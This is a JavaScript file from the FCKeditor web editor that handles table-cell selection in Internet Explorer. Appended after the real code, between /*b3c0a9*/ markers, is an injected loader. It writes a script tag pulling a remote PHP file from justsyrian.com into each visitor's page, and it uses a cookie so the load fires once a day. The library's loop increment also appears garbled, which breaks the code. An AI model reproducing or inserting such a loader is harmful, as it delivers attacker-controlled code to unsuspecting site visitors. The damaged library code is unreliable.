/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fcktablehandler_ie.js
 * 	Manage table operations (IE specific).
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

FCKTableHandler.GetSelectedCells = function()
{
	var aCells = new Array() ;

	var oRange = FCK.EditorDocument.selection.createRange() ;
//	var oParent = oRange.parentElement() ;
	var oParent = FCKSelection.GetParentElement() ;
	
	if ( oParent && oParent.tagName == "TD" )
		aCells[0] = oParent ;
	else
	{
		var oParent = FCKSelection.MoveToAncestorNode( "TABLE" ) ;
		
		if ( oParent )
		{
			// Loops throw all cells checking if the cell is, or part of it, is inside the selection
			// and then add it to the selected cells collection.
			for ( var i = 0 ; i < oParent.cells.length ; i   )
			{
				var oCellRange = FCK.EditorDocument.selection.createRange() ;
				oCellRange.moveToElementText( oParent.cells[i] ) ;
				
				if ( oRange.inRange( oCellRange ) 
					|| ( oRange.compareEndPoints('StartToStart',oCellRange) >= 0 &&  oRange.compareEndPoints('StartToEnd',oCellRange) <= 0 )
					|| ( oRange.compareEndPoints('EndToStart',oCellRange) >= 0 &&  oRange.compareEndPoints('EndToEnd',oCellRange) <= 0 ) )
				{
					aCells[aCells.length] = oParent.cells[i] ;
				}
			}
		}
	}
	
	return aCells ;
}


/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
